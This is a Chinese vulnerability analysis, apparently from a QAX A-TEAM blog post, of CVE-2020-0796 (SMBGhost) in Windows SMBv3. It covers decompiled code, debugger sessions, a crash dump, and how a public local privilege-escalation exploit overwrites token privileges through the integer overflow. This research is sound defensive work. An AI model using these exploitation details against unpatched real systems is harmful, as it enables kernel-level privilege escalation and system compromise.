> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q)

本文作者  Strawberry @ QAX A-TEAM

![](https://mmbiz.qpic.cn/mmbiz_gif/EkibxOB3fs4icwQQAZE6MBepadE7zAutkviaEmicgZWqGCPAvRDxD3EhVvrLJQckeqTGqC7Hmc08MTUxXeaMq5pVXw/640?wx_fmt=gif)

      2020 年 3 月 12 日，微软官方发布了 Windows SMBv3 客户端 / 服务器远程代码执行漏洞的安全更新细节和补丁程序，此漏洞可能允许攻击者在 SMB 服务器或客户端上远程执行代码，漏洞编号为 CVE-2020-0796，微软官方将此漏洞标记为 “被利用可能性高”。本文对此漏洞进行分析，如有不足之处，欢迎批评指正。

![](https://mmbiz.qpic.cn/mmbiz_gif/EkibxOB3fs4icwQQAZE6MBepadE7zAutkviaEmicgZWqGCPAvRDxD3EhVvrLJQckeqTGqC7Hmc08MTUxXeaMq5pVXw/640?wx_fmt=gif)

声明：本篇文章由 Strawberry @ QAX A-TEAM 原创，仅用于技术研究，不恰当使用会造成危害，严禁违法使用 ，否则后果自负。

QAX A-TEAM

2020 年 3 月 12 日，微软官方发布了 Windows SMBv3 客户端 / 服务器远程代码执行漏洞的安全更新细节和补丁程序，此漏洞可能允许攻击者在 SMB 服务器或客户端上远程执行代码，漏洞编号为 CVE-2020-0796，微软官方将此漏洞标记为 “被利用可能性高”。目前网上已经出现触发漏洞的 POC 和本地提权 EXP，还有几篇从不同角度对漏洞进行阐述的文章 (包括但不限于以下几篇)，本文会以菜鸡视角来对此漏洞进行分析：

https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html [漏洞复现]

https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/ [漏洞利用]

https://paper.seebug.org/1164/ [亮点：提权 EXP 分析]

https://mp.weixin.qq.com/s/hhmDz9-37EBbL8mlgnLi4A [亮点：协议分析]

**协议分析**

本地提权 EXP 出来了，嘿嘿嘿先抓包。可以看到客户端先向服务器发送 SMB Negotiate 请求，服务器响应该请求，这里主要是协商 SMB 协议版本、哈希算法以及压缩算法。协商一致后，客户端（攻击者）会发送 SMB3 Compression 数据包（ProtocolId 为 0xfc4d5342），最显眼的是，其 OriginalSize 被设置为 0xFFFFFFFF。

![](https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs49fPBuu4BXiaQ4ISrLqp9W1eM0TFh8UvcnQRxgxzJAUHyZd8EHCujSLUR0qgCia1Bs3t31LyaXrEfAg/640?wx_fmt=png)

SMB3 Compression 数据包传送时需要使用 SMB2 COMPRESSION_TRANSFORM_HEADER 头，在这个结构中定义了以下几个字段：

```
ProtocolId（4个字节）：协议标识符。在COMPRESSION_TRANSFORM_HEADER中，该值必须设置为0x424D53FC，按网络顺序可表示为 0xFC，"S"，"M" 和 "B"。
OriginalCompressedSegmentSize（4个字节）：数据压缩前的长度
CompressionAlgorithm（2个字节）：可选取CompressionAlgorithms字段中指定的用于压缩SMB2消息的算法之一，"NONE"除外。
flag（2个字节）：必须为2个特定值之一，SMB2_COMPRESSION_FLAG_NON（0）或SMB2_COMPRESSION_FLAG_CHAINED（1），0代表不支持链式压缩，1代表支持链式压缩。
Offset/Length (4个字节）：如果在Flags字段中设置了SMB2_COMPRESSION_FLAG_CHAINED，则该字段必须解释为长度，表示数据压缩后的长度（以字节为单位）；否则，该字段必须解释为偏移，表示从此结构末尾到压缩数据开始的偏移量（以字节为单位）。

```

SMB2 COMPRESSION_TRANSFORM_HEADER 头后面紧接着就是压缩数据，另外，如果 Offset/Length 字段被解析为 Offset 且 Offset 的值大于 0，则在压缩数据前面还会填充一些数据。

![](https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs49fPBuu4BXiaQ4ISrLqp9W1eLS7FdEfsCwQNcbVMukf3x0LEQshd7iczpJ3JLmYiaLMWOTqnAr5bSXicw/640?wx_fmt=png)

对比抓包数据可以发现，数据包中的 OriginalSize 对应了 SMB2 COMPRESSION_TRANSFORM_HEADER 结构中的 OriginalCompressedSegmentSize，指明了压缩前数据的长度。数据包中 Flag 字段被设置为 SMB2_COMPRESSION_FLAG_NON（0），因而 Offset/Length 字段就会被解释为偏移（Offset），wireshark 已经将其解析为 0x10，所以 SMB2 COMPRESSION_TRANSFORM_HEADER 偏移 0x10+Offset 处就是压缩数据了（0x10 为 SMB2 COMPRESSION_TRANSFORM_HEADER 长度）。

**漏洞分析**

漏洞存在于 srv2.sys 的 Srv2DecompressData 函数中，要想进入这个函数需要和对端协商出 SMB 3.1.1 版本并向其发送带 COMPRESSION_TRANSFORM_HEADER 的压缩数据包，相关的文章很多，这里不再做进一步说明。下面是产生漏洞的关键流程，首先将 Size.m128i_i32[1] 和 v4.m128i_i32[1] 相加作为 SrvNetAllocateBuffer 函数的第一个参数，后面会将其返回值偏移 0x18 处的数据作为地址，然后再加上 Size.m128i_u32[3] 偏移作为 SmbCompressionDecompress 函数的第 4 个参数，也就是 UncompressedBuffer 地址。

```
  v1 = a1;
  v2 = *(_QWORD *)(a1 + 0xF0);
  if ( *(_DWORD *)(v2 + 0x24) < 0x10u )         // 判断SMB Compression数据是不是大于等于0x10，如果不是的话就直接返回0xC000090B
    return 0xC000090Bi64;
  v3 = *(__m128i *)*(_QWORD *)(v2 + 0x18);      // v3指向COMPRESSION_TRANSFORM_HEADER
  Size = v3;
  v4 = _mm_srli_si128(v3, 8);                   // v3右移8个字节给v4
  v5 = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 0x50) + 0x1F0i64) + 0x8Ci64);
  if ( v5 != v4.m128i_u16[0] )                 
    return 0xC00000BBi64;
  v7 = SrvNetAllocateBuffer((unsigned int)(Size.m128i_i32[1] + v4.m128i_i32[1]), 0i64);// 这两个值分别是OriginalSize和Offset，整数溢出
  v8 = v7;
  if ( !v7 )
    return 0xC000009Ai64;
  if ( (int)SmbCompressionDecompress(
              v5,                               // CompressionAlgorithm，2，LZ77
              *(_QWORD *)(*(_QWORD *)(v1 + 0xF0) + 0x18i64) + Size.m128i_u32[3] + 0x10i64,// CompressedBuffer
              (unsigned int)(*(_DWORD *)(*(_QWORD *)(v1 + 0xF0) + 0x24i64) - Size.m128i_i32[3] - 0x10),// CompressedBufferSize
              Size.m128i_u32[3] + *(_QWORD *)(v7 + 0x18),// UncompressedBuffer
              Size.m128i_i32[1],                // OriginalCompressedSegmentSize
              &v11) < 0 
    || (v9 = v11, v11 != Size.m128i_i32[1]) )

```

这里数据比较复杂，我们要先弄清楚 Size.m128i_i32[1]、v4.m128i_i32[1] 等代表的是什么。通过调试可以发现，v3 为从 COMPRESSION_TRANSFORM_HEADER 起的 16 字节数，即 0x0000001000000002ffffffff424d58fc，而 Size = v3，v4 = _mm_srli_si128(v3, 8)，所以 Size 为 0x0000001000000002ffffffff424d58fc，v4 为 0x00000000000000000000001000000002。因此 Size.m128i_i32[i]、v4.m128i_i32[i]（i<4）分别如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs49fPBuu4BXiaQ4ISrLqp9W1eiccGpVMTqqQ1YbJNR8HnLoibrsYlNLHVI2ibwP6FspLllYiads4C6mwt3g/640?wx_fmt=png)

现在再来看 SrvNetAllocateBuffer 函数的两个参数，分别为 (unsigned int)（OriginalCompressedSegmentSize+Offset）（这里存在整数溢出，函数会使用这个值来申请特定大小的内存空间）和 0，其返回值为 v7（SmbCompressionDecompress 函数的参数见后面分析）。如下所示，rax（OriginalCompressedSegmentSize）为 0xFFFFFFFF，rcx（Offset）为 0x10，正常情况下两个数相加结果应该为 0x10000000f，但由于 OriginalCompressedSegmentSize 和 Offset 均为 4 字节数，程序直接使用 eax 和 ecx 相加，丢掉进位导致相加结果为 0xf，产生了整数溢出。

```
3: kd> r
rax=ffffffff424d53fc rbx=ffffde864fec0010 rcx=0000001000000002
rdx=0000000000000000 rsi=ffffffffffffffff rdi=ffffde864fec0010
rip=fffff8035ff87ecf rsp=ffff9c8f557a1e70 rbp=0000000000000002
 r8=0000000000000000  r9=fffff80360eb0000 r10=ffffde864f2bced0
r11=ffff9c8f557a1cd8 r12=0000000000000000 r13=ffffde864f2bcf80
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
srv2!Srv2DecompressData+0x6f:
fffff803`5ff87ecf 48c1e820        shr     rax,20h
3: kd> p
srv2!Srv2DecompressData+0x73:
fffff803`5ff87ed3 48c1e920        shr     rcx,20h
3: kd> p
srv2!Srv2DecompressData+0x77:
fffff803`5ff87ed7 03c8            add     ecx,eax
3: kd> r 
rax=00000000ffffffff rbx=ffffde864fec0010 rcx=0000000000000010
rdx=0000000000000000 rsi=ffffffffffffffff rdi=ffffde864fec0010
rip=fffff8035ff87ed7 rsp=ffff9c8f557a1e70 rbp=0000000000000002
 r8=0000000000000000  r9=fffff80360eb0000 r10=ffffde864f2bced0
r11=ffff9c8f557a1cd8 r12=0000000000000000 r13=ffffde864f2bcf80
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202
srv2!Srv2DecompressData+0x77:
fffff803`5ff87ed7 03c8            add     ecx,eax
3: kd> ? @rax+@rcx
Evaluate expression: 4294967311 = 00000001`0000000f
3: kd> p
srv2!Srv2DecompressData+0x79:
fffff803`5ff87ed9 48ff15489a0200  call    qword ptr [srv2!_imp_SrvNetAllocateBuffer (fffff803`5ffb1928)]
3: kd> r rcx
rcx=000000000000000f

```

在 SrvNetAllocateBuffer 函数中会根据第一个参数的长度范围来决定 UncompressedBuffer 缓冲区的大小，当 a1 小于等于 0x1100 时，将会申请长度为 0x1100 的 UncompressedBuffer 缓冲区。这里 OriginalCompressedSegmentSize 和 Offset 相加的值为 0xf（a1），小于 0x1100，于是后面会去调用 PplGenericAllocateFunction(0x200，0x1100，“LS00”，v10)，然后会通过 SrvNetBufferLookasideAllocate 函数去调用 SrvNetAllocateBufferFromPool 函数。

```
    if ( a1 > 0x1100 )
    {
      v13 = a1 - 256;
      _BitScanReverse64((unsigned __int64 *)&v14, v13);
      _BitScanForward64((unsigned __int64 *)&v15, v13);
      if ( (_DWORD)v14 == (_DWORD)v15 )
        v3 = v14 - 12;
      else
        v3 = v14 - 11;
    }
    v6 = SrvNetBufferLookasides[0];

```

SrvNetAllocateBufferFromPool 函数会调用 ExAllocatePoolWithTag(PoolType = 0x200，NumberOfBytes = 0x1278，Tag = "LS00") 申请分配大小为 0x1278 的内存空间。该内存空间起始处偏移 0x1150 处为 v12（v12 将是 SrvNetAllocateBufferFromPool 函数的返回值），该内存空间起始处偏移 0x50 处的值被存放在 v12 偏移 0x18 处。v12 偏移 0x20 处为 0x1100（上层函数传入的参数，表示 UncompressedBuffer 缓冲区的长度），v12 偏移 0x28 处为该内存空间的长度 0x1278。v12 偏移 0x38 处和 0x50 处分别指向 2 个 MDL 结构。

```
  v8 = (char *)ExAllocatePoolWithTag((POOL_TYPE)0x200, v7, 0x3030534Cu);
  ......
  v12 = (unsigned __int64)&v8[v2 + 0x57] & 0xFFFFFFFFFFFFFFF8ui64;// 0xffffde86506bc150
  *(_QWORD *)(v12 + 0x30) = v8;
  *(_QWORD *)(v12 + 0x50) = (v12 + v5 + 0x97) & 0xFFFFFFFFFFFFFFF8ui64;// 0xffffde86506bc228
  v13 = (v12 + 0x97) & 0xFFFFFFFFFFFFFFF8ui64;  // 0xffffde86506bc1e0
  *(_QWORD *)(v12 + 0x18) = v8 + 0x50;
  *(_QWORD *)(v12 + 0x38) = v13;
  *(_WORD *)(v12 + 0x10) = 0;
  *(_WORD *)(v12 + 0x16) = 0;
  *(_DWORD *)(v12 + 0x20) = v2;
  *(_DWORD *)(v12 + 0x24) = 0;
  v14 = ((_WORD)v8 + 0x50) & 0xFFF;
  *(_DWORD *)(v12 + 0x28) = v7;
  *(_DWORD *)(v12 + 0x40) = 0;
  *(_QWORD *)(v12 + 0x48) = 0i64;
  *(_QWORD *)(v12 + 0x58) = 0i64;
  *(_DWORD *)(v12 + 0x60) = 0;

```

下面是调试数据，0xffffa30b2d0dd150 为 SrvNetAllocateBuffer 函数的返回值，可以看出该地址偏移 0x18 处的地址至该地址处的距离正好为 0x1100。因为这个结构位于 ExAllocatePoolWithTag 函数分配的内存空间 0x1150 偏移处，而 0xffffa30b2d0dd150 位于该内存空间偏移 0x50 处，所以正好是 0x1100 的长度。

```
2: kd> dd ffffa30b2d0dc050 + 1100
ffffa30b`2d0dd150  00000000 00000000 00001000 0077006f
ffffa30b`2d0dd160  00000000 00000002 2d0dc050 ffffa30b
ffffa30b`2d0dd170  00001100 00000000 00001278 0030002e
ffffa30b`2d0dd180  2d0dc000 ffffa30b 2d0dd1e0 ffffa30b
ffffa30b`2d0dd190  00000000 00420055 00000000 00000000
ffffa30b`2d0dd1a0  2d0dd228 ffffa30b 00000000 00000000
ffffa30b`2d0dd1b0  00000000 00000000 00001000 00000063
ffffa30b`2d0dd1c0  00450053 00530053 7746d000 00000000

```

然后服务端会调用 SmbCompressionDecompress 函数，其参数如下（通过前面分析出的），可以发现解压后的数据会放在 Offset + *(_QWORD *)(v7 + 0x18) 处：

```
CompressionAlgorithm：2，LZ77
CompressedBuffer：*COMPRESSION_TRANSFORM_HEADER + sizeof(COMPRESSION_TRANSFORM_HEADER) + Offset
CompressedBufferSize：SMB Compression size - sizeof(COMPRESSION_TRANSFORM_HEADER) - Offset
UncompressedBuffer：Offset + *(_QWORD *)(v7 + 0x18)
OriginalCompressedSegmentSize：OriginalCompressedSegmentSize

```

程序调用 SmbCompressionDecompress 函数将数据包中的压缩数据按照协商的压缩算法 (LZ77) 解压之后的数据放在 SrvNetAllocateBuffer 函数返回的内存空间 *(_QWORD *)(v7 + 0x18)偏移 Offset 处，由于漏洞的存在，解压后的数据可以超出为 UncompressedBuffer 申请的内存空间，从而覆盖后面的关键变量，即 (_QWORD *)(v7 + 0x18) 中的值。在后面的代码中（如下所示），如果 Size.m128i_i32[3]存在（Offset 不为 0），会将数据包中压缩数据前（从 Offset 字段到压缩数据之间的数据）的内容复制到 *(_QWORD *)(v7 + 0x18)，由于这两块数据都可控，因而可以实现任意地址写。

```
if ( Size.m128i_i32[3] )                      // 0x10
  {
    memmove(                                    // 重构数据，恢复到压缩前的状态，前面为0x10字节数据，后面为解压缩后的数据
                                                // 3: kd> ? 0xffffa30b2d0dd150+0x18-0xffffa30b2d0dc060
                                                // Evaluate expression: 4360 = 00000000`00001108
      *(void **)(v8 + 0x18),                    
      (const void *)(*(_QWORD *)(*(_QWORD *)(v1 + 0xF0) + 0x18i64) + 0x10i64),
      Size.m128i_u32[3]);                       
    v9 = v11;
  }

```

在此先对漏洞进行总结，微软 SMB 服务器（客户端）在解析 SMB 3.1.1 版本压缩数据包时存在整数溢出漏洞，在 Srv2DecompressData 函数中会计算 OriginalCompressedSegmentSize 和 Offset 相加的值，后面又将这个值作为 SrvNetAllocateBuffer 函数的长度参数，由于 Srv2DecompressData 函数没有对这三个值进行额外的判断，会导致整数溢出，然后后面调用 SrvNetAllocateBuffer 函数会分配一个较小的内存空间。攻击者可以将 OriginalCompressedSegmentSize 和 Offset 其中一个的值设置为边界值，假设为 0xFFFFFFFF，由于 Size.m128i_i32[1] 和 v4.m128i_i32[1] 均为 4 字节有符号数，那 0xFFFFFFFF 就会被看作 -1，这两个值的和为除了 0xFFFFFFFF 之外的另一个值减 1，那么申请出来的 buffer 空间相比于 0xFFFFFFFF 会很小，这里假设为 0x1100。那么在后续的 SmbCompressionDecompress 函数中，要么会在向缓冲区复制过量数据时（缓冲区溢出），因为访问到无法访问的内存后触发系统崩溃；要么会在通过偏移 0xFFFFFFFF 访问内存时（非法访问），因为访问到无法访问的内存后触发系统崩溃。对于第一种情况（后面漏洞利用会用到的情况），我们可以将 EXP 中待压缩数据的长度增大，并同步计算 SMB 压缩数据的长度，从而触发 BSOD（漏洞验证）。

```
1: kd> !analyze -v
Connected to Windows 10 18362 x64 target at (Thu Apr  2 18:27:33.946 2020 (UTC + 8:00)), ptr64 TRUE
Loading Kernel Symbols
...............................................................
................................................................
................................................................
............
Loading User Symbols
Loading unloaded module list
.........
************* Symbol Loading Error Summary **************
Module name            Error
SharedUserData         No error - symbol load deferred
You can troubleshoot most symbol related issues by turning on symbol loading diagnostics (!sym noisy) and repeating the command that caused symbols to be loaded.
You should also verify that your symbol search path (.sympath) is correct.
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************
PAGE_FAULT_IN_NONPAGED_AREA (50)
Invalid system memory was referenced.  This cannot be protected by try-except.
Typically the address is just plain bad or it is pointing at freed memory.
Arguments:
Arg1: ffffcd0cef77f000, memory referenced.
Arg2: 0000000000000002, value 0 = read operation, 1 = write operation.
Arg3: fffff8004b17a5c0, If non-zero, the instruction address which referenced the bad memory
    address.
Arg4: 0000000000000002, (reserved)
Debugging Details:
------------------
KEY_VALUES_STRING: 1
    Key  : Analysis.CPU.Sec
    Value: 3
    Key  : Analysis.DebugAnalysisProvider.CPP
    Value: Create: 8007007e on LAPTOP-LTGNKQIH
    Key  : Analysis.DebugData
    Value: CreateObject
    Key  : Analysis.DebugModel
    Value: CreateObject
    Key  : Analysis.Elapsed.Sec
    Value: 4
    Key  : Analysis.Memory.CommitPeak.Mb
    Value: 103
    Key  : Analysis.System
    Value: CreateObject
ADDITIONAL_XML: 1
BUGCHECK_CODE:  50
BUGCHECK_P1: ffffcd0cef77f000
BUGCHECK_P2: 2
BUGCHECK_P3: fffff8004b17a5c0
BUGCHECK_P4: 2
READ_ADDRESS:  ffffcd0cef77f000 Nonpaged pool
MM_INTERNAL_CODE:  2
PROCESS_NAME:  System
TRAP_FRAME:  fffffa03b6858c00 -- (.trap 0xfffffa03b6858c00)
NOTE: The trap frame does not contain all registers.
Some register values may be zeroed or incorrect.
rax=00000000fffffffe rbx=0000000000000000 rcx=00000000000fe060
rdx=ffffcd0cef87d060 rsi=0000000000000000 rdi=0000000000000000
rip=fffff8004b17a5c0 rsp=fffffa03b6858d98 rbp=ffffcd0cef77d060
 r8=ffffcd0cefa7f5af  r9=00000000000fffff r10=ffffcd0cef87d060
r11=ffffcd0cefa7f5af r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei ng nz ac pe cy
nt!RtlDecompressBufferXpressLz+0x2d0:
fffff800`4b17a5c0 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
Resetting default scope
STACK_TEXT:  
fffffa03`b68581b8 fffff800`4b2c5522 : ffffcd0c`ef77f000 00000000`00000003 fffffa03`b6858320 fffff800`4b139b90 : nt!DbgBreakPointWithStatus
fffffa03`b68581c0 fffff800`4b2c4c12 : fffff800`00000003 fffffa03`b6858320 fffff800`4b1f1b60 00000000`00000050 : nt!KiBugCheckDebugBreak+0x12
fffffa03`b6858220 fffff800`4b1dd5e7 : fffff800`4b482478 fffff800`4b2ef0b5 ffffcd0c`ef77f000 ffffcd0c`ef77f000 : nt!KeBugCheck2+0x952
fffffa03`b6858920 fffff800`4b1ff5d6 : 00000000`00000050 ffffcd0c`ef77f000 00000000`00000002 fffffa03`b6858c00 : nt!KeBugCheckEx+0x107
fffffa03`b6858960 fffff800`4b08eeef : 00000000`00000000 00000000`00000002 00000000`00000000 ffffcd0c`ef77f000 : nt!MiSystemFault+0x1d6866
fffffa03`b6858a60 fffff800`4b1eb520 : ffffcd0c`efa7f5a7 fffffa03`b6858c80 00000000`00000000 00000000`0000bfe0 : nt!MmAccessFault+0x34f
fffffa03`b6858c00 fffff800`4b17a5c0 : ffffcd0c`efa7f5a0 ffffcd0c`ef77d060 fffff800`4b14c316 ffffcd0c`ef77d060 : nt!KiPageFault+0x360
fffffa03`b6858d98 fffff800`4b14c316 : ffffcd0c`ef77d060 00000000`ffffffff fffffa03`b6858ed0 ffffcd0c`efe3d000 : nt!RtlDecompressBufferXpressLz+0x2d0
fffffa03`b6858db0 fffff800`49f6e58d : 00000000`00000003 00000000`0000000f 00000000`00000010 fffff800`00000000 : nt!RtlDecompressBufferEx2+0x66
fffffa03`b6858e00 fffff800`50cb7f41 : ffffcd0c`0000ef27 ffffcd0c`ef77e150 00000000`00000002 00000000`00000010 : srvnet!SmbCompressionDecompress+0xdd
fffffa03`b6858e70 fffff800`50cb699e : 00000000`00000000 ffffcd0c`efa7f010 00000000`00000001 ffffffff`ffffffff : srv2!Srv2DecompressData+0xe1
fffffa03`b6858ed0 fffff800`50cf9a9f : ffffcd0c`efa7f020 ffffcd0c`eebe0001 ffffcd0c`eebe0000 fffff800`4b148e00 : srv2!Srv2DecompressMessageAsync+0x1e
fffffa03`b6858f00 fffff800`4b1e0dae : fffffa03`b6850050 fffffa03`b6822a01 ffffffff`ee1e5d00 fffffa03`b6858fd1 : srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f
fffffa03`b6858f80 fffff800`4b1e0d6c : fffffa03`b6858fd1 ffffcd0c`eebe0040 fffffa03`b6859000 fffff800`4b08616e : nt!KxSwitchKernelStackCallout+0x2e
fffffa03`b6822970 fffff800`4b08616e : fffffa03`b6858fd1 fffffa03`b6859000 00000000`00000000 00000000`00000000 : nt!KiSwitchKernelStackContinue
fffffa03`b6822990 fffff800`4b085f6c : fffff800`50cf9960 ffffcd0c`eb8bbc80 00000000`00000002 00000000`00000000 : nt!KiExpandKernelStackAndCalloutOnStackSegment+0x18e
fffffa03`b6822a30 fffff800`4b085de3 : 00000000`00000080 00000000`00000088 ffffcd0c`eebe0040 fffffa03`b6822b80 : nt!KiExpandKernelStackAndCalloutSwitchStack+0xdc
fffffa03`b6822aa0 fffff800`4b085d9d : fffff800`50cf9960 ffffcd0c`eb8bbc80 ffffcd0c`eb8bbc80 00000000`00000088 : nt!KeExpandKernelStackAndCalloutInternal+0x33
fffffa03`b6822b10 fffff800`50cf97f7 : ffffcd0c`00000000 00000000`00000000 ffffbc8d`8daa7950 00000000`00000000 : nt!KeExpandKernelStackAndCalloutEx+0x1d
fffffa03`b6822b50 fffff800`4b7356f7 : ffffcd0c`e7bc9000 ffffcd0c`eebe0040 ffff9481`d49c1180 00000000`00000000 : srv2!RfspThreadPoolNodeWorkerRun+0x117
fffffa03`b6822bb0 fffff800`4b1467a5 : ffffcd0c`eebe0040 fffff800`4b7356c0 ffffbc8d`8daa7950 00002427`b19bbdff : nt!IopThreadStart+0x37
fffffa03`b6822c10 fffff800`4b1e4b2a : ffff9481`d49c1180 ffffcd0c`eebe0040 fffff800`4b146750 00000000`00000000 : nt!PspSystemThreadStartup+0x55
fffffa03`b6822c60 00000000`00000000 : fffffa03`b6823000 fffffa03`b681d000 00000000`00000000 00000000`00000000 : nt!KiStartSystemThread+0x2a
SYMBOL_NAME:  srvnet!SmbCompressionDecompress+dd
MODULE_NAME: srvnet
IMAGE_NAME:  srvnet.sys
STACK_COMMAND:  .thread ; .cxr ; kb
BUCKET_ID_FUNC_OFFSET:  dd
FAILURE_BUCKET_ID:  AV_INVALID_srvnet!SmbCompressionDecompress
OS_VERSION:  10.0.18362.1
BUILDLAB_STR:  19h1_release
OSPLATFORM_TYPE:  x64
OSNAME:  Windows 10
FAILURE_ID_HASH:  {6c992fa9-0b40-1362-ba5c-92be13d2b8d8}
Followup:     MachineOwner

```

**漏洞利用**

经过前面的分析可知，Srv2DecompressData 函数在处理 SMB 压缩数据包的时候，会计算 OriginalCompressedSegmentSize 和 Offset 相加的值，但这里没有判断相加后的值是否大于等于这两个值（无符号）中的任何一个，所以会产生整数溢出。后面又将这个值作为 SrvNetAllocateBuffer 函数的长度参数，由于该函数的特性，我们可以控制其为 UncompressedBuffer 分配缓冲区的大小（这里为 0x1100）。SrvNetAllocateBuffer 函数返回的并不是这个缓冲区首地址，而是指明这个缓冲区的一个结构，这个结构偏移 0x18 处为这个缓冲区起始地址。解压的时候会从这个缓冲区偏移 Offset 处开始复制解压数据，如果压缩前的数据长度大于 0x1100-Offset，就有可能覆盖到缓冲区后面的结构，比如 UncompressedBuffer 缓冲区首地址（在下图中，UncompressedBuffer 缓冲区包括 Data 和 Decompressed Buffer，Offset 偏移指向 Decompressed Buffer）。而这个地址在后面还有可能被用到，因为如果 Offset 存在，会将 Offset 和压缩数据之间的数据复制到这个地址处，这些数据在发包的时候可以被构造，这样我们就可以将任意数据写入指定的地址。

![](https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs49fPBuu4BXiaQ4ISrLqp9W1eT8uiaeZD6puoXx2R8RgQKmhQ96UvkG7LpqZvrluUg7f9RTahW8j5w7w/640?wx_fmt=png)

提权程序（EXP）利用溢出和任意地址写修改 SEP_TOKEN_PRIVILEGES 结构中的关键数据。首先提权程序获取自身的 token，通过 0x40 偏移得到 SEP_TOKEN_PRIVILEGES 结构的首地址 x，然后通过溢出使用 x 精准覆盖结构体中存放的 UncompressedBuffer 缓冲区首地址，覆盖前为 0xffffde86506bb050，覆盖后变成了 0xffffa28d201ee6b0。

```
//覆盖前
3: kd> dd r9+1100
ffffde86`506bc160  00000002 00000003 506bb050 ffffde86
ffffde86`506bc170  00001100 00000000 00001278 00000000
//覆盖后
3: kd> dd ffffde86`506bc160
ffffde86`506bc160  41414141 41414141 201ee6b0 ffffa28d
ffffde86`506bc170  00001100 00000000 00001278 00000000

```

SEP_TOKEN_PRIVILEGES 是位于 token 偏移 0x40 处的结构，该结构中包含与令牌相关的特权的所有信息，其中 Present 为令牌当前可用的权限；Enabled 为已启用的权限；EnabledByDefault 为默认情况下已启用的权限。它们都采用 8 字节数据来存储特权的开关，从低位起每一个 bit 位表示一个指定特权。

```
3: kd> dt nt!_token
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER
   +0x030 TokenLock        : Ptr64 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
3: kd> dt nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : Uint8B
   +0x008 Enabled          : Uint8B
   +0x010 EnabledByDefault : Uint8B

```

后面利用任意地址写，使用 0x1ff2ffffbc 分别覆盖该结构的 Present 和 Enabled 字段，从而实现提权。为什么是 0x1ff2ffffbc 呢，因为在 system 进程中，当前可用的权限（Present）就被设置为 0x1ff2ffffbc，如下所示。但这些权限并不是都启用的，这个和 Enabled 相关，由于这里 Enabled 和 EnabledByDefault 相同，所以只开启了默认启用的特权，如下所示：

```
//memmove前程序的SEP_TOKEN_PRIVILEGES结构
3: kd> dt nt!_SEP_TOKEN_PRIVILEGES ffffa28d201ee6b0
   +0x000 Present          : 0x00000006`02880000
   +0x008 Enabled          : 0x800000
   +0x010 EnabledByDefault : 0x40800000
//memmove后程序的SEP_TOKEN_PRIVILEGES结构
3: kd> dt nt!_SEP_TOKEN_PRIVILEGES ffffa28d201ee6b0
   +0x000 Present          : 0x0000001f`f2ffffbc
   +0x008 Enabled          : 0x0000001f`f2ffffbc
   +0x010 EnabledByDefault : 0x40800000
//system进程特权
0: kd> dx -id 0,0,ffffde8649065040 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffa28d19406110))
(*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffa28d19406110))                 [Type: _SEP_TOKEN_PRIVILEGES]
    [+0x000] Present          : 0x1ff2ffffbc [Type: unsigned __int64]
    [+0x008] Enabled          : 0x1e60b1e890 [Type: unsigned __int64]
    [+0x010] EnabledByDefault : 0x1e60b1e890 [Type: unsigned __int64]
Privs: 
 02 0x000000002 SeCreateTokenPrivilege            Attributes - 
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default 
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default 
 08 0x000000008 SeSecurityPrivilege               Attributes - 
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
 10 0x00000000a SeLoadDriverPrivilege             Attributes - 
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default 
 12 0x00000000c SeSystemtimePrivilege             Attributes - 
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default 
 17 0x000000011 SeBackupPrivilege                 Attributes - 
 18 0x000000012 SeRestorePrivilege                Attributes - 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 28 0x00000001c SeManageVolumePrivilege           Attributes - 
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default 
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - 
 32 0x000000020 SeRelabelPrivilege                Attributes - 
